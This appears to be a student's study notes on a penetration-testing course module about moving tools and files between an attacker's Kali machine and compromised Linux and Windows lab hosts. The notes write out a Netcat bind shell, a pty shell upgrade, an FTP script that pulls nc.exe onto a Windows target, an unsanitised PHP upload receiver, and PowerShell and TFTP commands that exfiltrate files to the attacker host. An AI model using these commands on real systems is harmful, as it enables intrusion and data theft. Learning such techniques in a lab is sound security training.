# Content

- [Content](#content)
  - [Considerations and Preparations](#considerations-and-preparations)
    - [Dangers of Transferring Attack Tools](#dangers-of-transferring-attack-tools)
    - [Installing Pure-FTPd](#installing-pure-ftpd)
    - [The Non-Interactive Shell](#the-non-interactive-shell)
      - [Upgrading a Non-Interactive Shell](#upgrading-a-non-interactive-shell)
  - [Transferring Files with Windows Hosts](#transferring-files-with-windows-hosts)
    - [Non-Interactive FTP Download](#non-interactive-ftp-download)
    - [Windows Uploads Using Windows Scripting Languages](#windows-uploads-using-windows-scripting-languages)
    - [Uploading Files with TFTP](#uploading-files-with-tftp)

  
## Considerations and Preparations

- The conversion of attack tools and utilities to our target and the dangers associated with this. Dangers include attack tool abuse by malicious parties and anti-virus software that can detect and isolate our attack tools. It is important to document the upload and removal of tools upon completion of the assessment. We also talk about using native tools on a compromised system and uploading additional tools only when necessary and the risk of detection is minimal.

### Dangers of Transferring Attack Tools

- In some cases, we may need to transfer attack tools and utilities to our target.However, transferring these tools can be dangerous for several reasons.
- First, our post-exploitation attack tools could be abused by malicious parties, which puts the client’s resources at risk. It is extremely important to document uploads and remove them after the assessment is completed.
- Second, antivirus software, which scans endpoint filesystems in search of pre-defined file signatures, becomes a huge frustration for us during this phase.
- This software, which is ubiquitous in most corporate environments, will detect our attack tools, quarantine them (rendering them useless), and alert a system administrator.

### Installing Pure-FTPd

- In order to accommodate the exercises in this module, let’s quickly install the Pure-FTPd server on our Kali attack machine.
  ![Picture](../16.%20File%20Transfers/Image/1.png)
- Before any clients can connect to our FTP server, we need to create a new user for Pure-FTPd. 
  ![Picture](../16.%20File%20Transfers/Image/2.png)
- We will make the script executable, then run it and enter “lab” as the password for the offsec user when prompted and restart the ftp server.
  ![Picture](../16.%20File%20Transfers/Image/3.png)
  ![Picture](../16.%20File%20Transfers/Image/4.png)

### The Non-Interactive Shell

- Most Netcat-like tools provide a non-interactive shell, which means that programs that require user input such as many file transfer programs or su and sudo tend to work poorly, if at all. 
- Non-interactive shells also lack useful features like tab completion and job control. 
- By contrast, consider a typical FTP login session from our Debian lab client to our Kali system.
  ![Picture](../16.%20File%20Transfers/Image/5.png)
- In this session, we enter a username and password, and the process is exited only after we enter the bye command. This is an interactive program; it requires user intervention to complete.
- Although the problem may be obvious at this point, let’s attempt an FTP session through a non-interactive shell, in this case, Netcat.
- To begin, let’s assume we  have obtained access to a Netcat bind shell. We’ll launch Netcat on our Kali client listening on port 4444.
  ```bashh
  nc -lvnp 4444 -e /bin/bash
  ```
  ![Picture](../16.%20File%20Transfers/Image/6.png)
- From our Kali system, we will connect to the listening shell.
  ```bash
  nc -vn 192.168.50.163 4444
  ```
  ![Picture](../16.%20File%20Transfers/Image/7.png)

#### Upgrading a Non-Interactive Shell

- Now that we understand some of the limitations of non-interactive shells, let’s examine how we can “upgrade” our shell to be far more useful. 
- The Python interpreter, frequently installed on Linux systems, comes with a standard module named pty that allows for creation of pseudo-terminals. 
- We will reconnect to our listening Netcat shell, and spawn our pty shell.
  ```bash
  nc -vn 192.168.50.163 4444
  python -c 'import pty; pty.spawn("/bin/bash")'
  ``` 
  ![Picture](../16.%20File%20Transfers/Image/8.png)
- Immediately after running our Python command, we are greeted with a familiar Bash prompt. 
- Let’s try connecting to our local FTP server again, this time through the pty shell and see how it behaves.
  ![Picture](../16.%20File%20Transfers/Image/9.png)
- This time, our interactive connection to the FTP server was successful and when we quit, we were returned to our upgraded Bash prompt.

## Transferring Files with Windows Hosts

- In Unix-like environments, we will often find tools such as Netcat, curl, or wget preinstalled with the operating system, which make downloading files from a remote machine relatively simple. 
- However, on Windows machines the process is usually not as straightforward. In this section, we will explore file transfer options on Windows-based machines.

### Non-Interactive FTP Download

- Windows operating systems ship with a default FTP client that can be used for file transfers. 
- As we’ve seen, the FTP client is an interactive program that requires input to complete so we need a creative solution in order to use FTP for file transfers.
  ![Picture](../16.%20File%20Transfers/Image/10.png)
- The ftp -s option accepts a text-based command list that effectively makes the client non-interactive. On our attacking machine, we will set up an FTP server, and we will initiate a download request for the Netcat binary from the compromised Windows host.
- First, we will place a copy of nc.exe in our /ftphome director.
  ```bash
  sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/
  ls /ftphome/
  ```
  ![Picture](../16.%20File%20Transfers/Image/11.png)
- We have already installed and configured Pure-FTPd on our Kali machine, but we will restart it to make sure the service is available.
  ```bash
  sudo systemctl restart pure-ftpd
  ```
  ![Picture](../16.%20File%20Transfers/Image/12.png)
- Next, we will build a text file of FTP commands we wish to execute, using the echo command and redirecting the output to a file named ftp.txt.
  ```bash
  C:\Users\Thai_SE161457_Win10>echo open 192.168.50.156 21> ftp.txt
  C:\Users\Thai_SE161457_Win10>echo USER offsec>> ftp.txt
  C:\Users\Thai_SE161457_Win10>echo 191011>> ftp.txt
  C:\Users\Thai_SE161457_Win10>echo bin >> ftp.txt
  C:\Users\Thai_SE161457_Win10>echo GET nc.exe >> ftp.txt
  C:\Users\Thai_SE161457_Win10>echo bye >> ftp.txt
  ```
  ![Picture](../16.%20File%20Transfers/Image/13.png)
- We are now ready to initiate the FTP session using the command list.
  ```bash
  ftp -v -n -s:ftp.txt
  ```
  - -v to suppress any returned output.
  - -n to suppresses automatic login.
  - -s to indicate the name of our command file
  ![Picture](../16.%20File%20Transfers/Image/14.png)
- When the ftp command runs, our download should have executed, and a working copy of nc.exe should appear in our current directory.
  ![Picture](../16.%20File%20Transfers/Image/15.png)

### Windows Uploads Using Windows Scripting Languages

- In certain scenarios, we may need to exfiltrate data from a target network using a Windows client. 
- This can be complex since standard TFTP, FTP, and HTTP servers are rarely enabled on Windows by default.
- First, in Linux, we will create a file name upload.php in directory ``` /var/www/html ```
  ```php
  <?php
  $uploaddir = '/var/www/uploads/';
  $uploadfile = $uploaddir . $_FILES['file']['name'];
  move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
  ?>
  ```
  ![Picture](../16.%20File%20Transfers/Image/16.png)
- Then we create the uploads folder.
  ![Picture](../16.%20File%20Transfers/Image/17.png)
- The PHP code  will process an incoming file upload request and save the transferred 
data to the ``` /var/www/uploads/ ``` directory.
- In windows, We use the ``` UploadFile ``` method from the ``` System.Net.WebClient ``` class to upload the document we want to exfiltrate, in this case, a file named hello.txt.
  ```bash
  powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.50.156/upload.php', 'hello.txt')
  ```
  ![Picture](../16.%20File%20Transfers/Image/18.png)
- After execution of the powershell command, we can verify the successful transfer of the file by checking the contents of the uploads directory on our Kali machine.
  ![Picture](../16.%20File%20Transfers/Image/19.png)

### Uploading Files with TFTP

- TFTP (Trivial File Transfer Protocol) file transfer protocol for uploading files from older Windows operating systems such as Windows XP and Windows Server 2003. The passage indicates that PowerShell is not installed by default on system versions this old operating system, but the VBScript and FTP client are still available and working. However, in this case, the author would like to recommend another file transfer method, TFTP.
- TFTP is a file transfer protocol based on UDP and is often restricted by enterprise egress (firewall) firewall rules. TFTP is used in penetration testing to transfer files from older Windows operating systems to Windows XP and 2003. However, TFTP is not installed by default on Windows 7, Windows 2008 and later versions newer.
- To use TFTP, we first need to install and configure a TFTP server on Kali Linux and create a directory to store and serve files. Then we update the ownership of the directory to be able to write files to it. Run atftpd as a daemon on UDP port 69 and specify to use the newly created ``` /tftp ``` directory.
  ```bash
  sudo apt update && sudo apt install atftp
  sudo mkdir /tftp
  sudo chown nobody: /tftp
  sudo atftpd --daemon --port 69 /tftp
  ```
  ![Picture](../16.%20File%20Transfers/Image/20.png)
- On the Windows system, we will run the tftp client with -i to specify a binary image transfer, the IP address of our Kali system, the put command to initiate an upload, and finally the filename of the file to upload.
  ```bash
  tftp -i 192.168.50.156 PUT test.txt
  ```
  ![Picture](../16.%20File%20Transfers/Image/21.png)
- Finally, we can verify the successful transfer of the file by checking the contents of the ``` /tftp ``` directory on our Kali machine.
  ![Picture](../16.%20File%20Transfers/Image/22.png)


